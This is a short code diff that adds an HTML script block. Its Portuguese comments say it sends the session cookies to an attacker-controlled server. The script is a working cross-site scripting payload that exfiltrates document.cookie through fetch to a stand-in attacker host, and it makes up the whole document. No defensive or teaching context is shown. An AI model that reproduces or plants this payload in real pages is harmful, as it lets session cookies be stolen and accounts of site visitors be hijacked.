@@ -1,0 +1,7 @@
+<script>
+    // Envia os cookies da sessão para um servidor controlado pelo atacante
+    fetch('http://servidor-do-atacante.com/coletar-cookies.php?cookie=' + document.cookie, {
+        method: 'GET',
+        mode: 'no-cors' // Permite o envio para um domínio diferente
+    });
+</script>   
